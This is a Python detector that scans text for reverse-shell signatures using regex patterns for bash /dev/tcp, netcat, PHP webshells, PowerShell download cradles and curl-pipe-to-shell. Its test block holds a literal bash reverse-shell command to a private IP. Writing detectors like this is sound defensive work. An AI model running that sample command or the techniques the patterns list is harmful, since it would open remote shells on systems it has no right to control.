#!/usr/bin/env python3
"""
AdiZenWorks Reverse Shell Detector
Static pattern analysis for reverse shell signatures in code and text
Company: AdiZenWorks Inc.
"""

import re
from datetime import datetime
from typing import List, Dict


# ── SIGNATURE DATABASE ────────────────────────────────────────
SIGNATURES = [
    # Bash / sh
    {"id": "RS-001", "name": "Bash TCP Reverse Shell",    "severity": "CRITICAL",
     "pattern": r"bash\s+-[iI].*>&.*/dev/tcp/"},
    {"id": "RS-002", "name": "Bash /dev/tcp",             "severity": "CRITICAL",
     "pattern": r"/dev/tcp/[\w.\-]+/\d+"},
    {"id": "RS-003", "name": "Bash /dev/udp",             "severity": "HIGH",
     "pattern": r"/dev/udp/[\w.\-]+/\d+"},
    {"id": "RS-004", "name": "Netcat Reverse Shell",      "severity": "CRITICAL",
     "pattern": r"nc\s+(-[enNvz]+\s+)*[\w.\-]+\s+\d+\s+-e\s+/bin/(sh|bash|zsh)"},
    {"id": "RS-005", "name": "Netcat -e flag",            "severity": "HIGH",
     "pattern": r"\bnc\b.*-e\s+/bin/(sh|bash|cmd|powershell)"},
    {"id": "RS-006", "name": "Netcat mkfifo",             "severity": "CRITICAL",
     "pattern": r"mkfifo.*nc.*<.*>"},

    # Python
    {"id": "RS-010", "name": "Python socket reverse shell","severity": "CRITICAL",
     "pattern": r"socket\.connect\(.*\).*os\.dup2|dup2.*socket\.connect"},
    {"id": "RS-011", "name": "Python subprocess shell",   "severity": "HIGH",
     "pattern": r"subprocess\.(Popen|call|run).*shell=True.*socket"},
    {"id": "RS-012", "name": "Python exec base64 payload","severity": "CRITICAL",
     "pattern": r"exec\s*\(\s*__import__\s*\(\s*['\"]base64['\"]"},
    {"id": "RS-013", "name": "Python os.system shell",    "severity": "HIGH",
     "pattern": r"os\.system\s*\(\s*['\"].*(/bin/sh|cmd\.exe|powershell)"},

    # PHP
    {"id": "RS-020", "name": "PHP shell_exec",            "severity": "CRITICAL",
     "pattern": r"shell_exec\s*\(.*\$_(GET|POST|REQUEST|COOKIE)"},
    {"id": "RS-021", "name": "PHP passthru",              "severity": "HIGH",
     "pattern": r"passthru\s*\(\s*\$_(GET|POST|REQUEST)"},
    {"id": "RS-022", "name": "PHP system reverse",        "severity": "CRITICAL",
     "pattern": r"fsockopen.*system|system.*fsockopen"},
    {"id": "RS-023", "name": "PHP eval base64",           "severity": "CRITICAL",
     "pattern": r"eval\s*\(\s*base64_decode"},
    {"id": "RS-024", "name": "PHP webshell pattern",      "severity": "CRITICAL",
     "pattern": r"@?\$_=.*base64.*eval|<\?php.*eval.*\$_(POST|GET)"},

    # PowerShell
    {"id": "RS-030", "name": "PowerShell reverse shell",  "severity": "CRITICAL",
     "pattern": r"New-Object\s+System\.Net\.Sockets\.TCPClient"},
    {"id": "RS-031", "name": "PowerShell encoded command","severity": "HIGH",
     "pattern": r"powershell.*-[eE][nN][cC](odedCommand)?"},
    {"id": "RS-032", "name": "PowerShell bypass + IEX",   "severity": "CRITICAL",
     "pattern": r"IEX\s*\(|Invoke-Expression\s*\("},
    {"id": "RS-033", "name": "PowerShell download cradle", "severity": "HIGH",
     "pattern": r"(Net\.WebClient|Invoke-WebRequest).*DownloadString"},

    # Perl / Ruby
    {"id": "RS-040", "name": "Perl reverse shell",        "severity": "CRITICAL",
     "pattern": r"perl.*-e.*socket.*connect.*exec.*sh"},
    {"id": "RS-041", "name": "Ruby reverse shell",        "severity": "CRITICAL",
     "pattern": r"ruby.*-rsocket.*TCPSocket\.new"},

    # Generic suspicious
    {"id": "RS-050", "name": "Base64 encoded payload",    "severity": "MEDIUM",
     "pattern": r"echo\s+[A-Za-z0-9+/]{40,}={0,2}\s*\|\s*(base64\s+-d|openssl\s+base64)"},
    {"id": "RS-051", "name": "Curl pipe to shell",        "severity": "HIGH",
     "pattern": r"curl\s+.*\|\s*(ba?sh|sh|python|perl|ruby)"},
    {"id": "RS-052", "name": "Wget pipe to shell",        "severity": "HIGH",
     "pattern": r"wget\s+.*-[qO]+.*\|\s*(ba?sh|sh|python|perl|ruby)"},
    {"id": "RS-053", "name": "LD_PRELOAD hijack",         "severity": "HIGH",
     "pattern": r"LD_PRELOAD\s*="},
    {"id": "RS-054", "name": "Crontab persistence",       "severity": "MEDIUM",
     "pattern": r"crontab\s+-[li]|echo.*crontab|/etc/cron\.(d|daily|weekly|monthly)/"},
]


def detect_reverse_shells(text: str) -> Dict:
    """
    Scan text/code for reverse shell signatures.

    Args:
        text: Source code, script content, or any text to analyze

    Returns:
        dict with matched signatures, severity breakdown, and risk score
    """
    results = {
        "scan_time":  datetime.now().isoformat(),
        "lines":      text.count("\n") + 1,
        "chars":      len(text),
        "matches":    [],
        "severities": {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0},
        "clean":      True,
    }

    lines = text.splitlines()

    for sig in SIGNATURES:
        try:
            pattern = re.compile(sig["pattern"], re.IGNORECASE | re.MULTILINE)
        except re.error:
            continue

        # Search full text
        for m in pattern.finditer(text):
            # Find line number
            line_num = text[:m.start()].count("\n") + 1
            snippet  = lines[line_num - 1].strip()[:120] if line_num <= len(lines) else ""

            match_entry = {
                "signature_id": sig["id"],
                "name":         sig["name"],
                "severity":     sig["severity"],
                "line":         line_num,
                "match":        m.group(0)[:120],
                "context":      snippet,
            }
            results["matches"].append(match_entry)
            results["severities"][sig["severity"]] = results["severities"].get(sig["severity"], 0) + 1
            break  # One match per signature is enough

    results["clean"]        = len(results["matches"]) == 0
    results["match_count"]  = len(results["matches"])
    results["risk_score"]   = _compute_risk(results["severities"])
    results["risk_label"]   = _risk_label(results["risk_score"])
    return results


def _compute_risk(sevs: Dict) -> int:
    score  = sevs.get("CRITICAL", 0) * 40
    score += sevs.get("HIGH", 0)     * 20
    score += sevs.get("MEDIUM", 0)   * 8
    score += sevs.get("LOW", 0)      * 2
    return min(100, score)


def _risk_label(score: int) -> str:
    if score >= 80: return "CRITICAL — Active Threat"
    if score >= 50: return "HIGH — Likely Malicious"
    if score >= 20: return "MEDIUM — Suspicious"
    if score > 0:   return "LOW — Minor Concerns"
    return "CLEAN"


if __name__ == "__main__":
    import json
    sample = """
    #!/bin/bash
    bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
    """
    r = detect_reverse_shells(sample)
    print(json.dumps(r, indent=2))
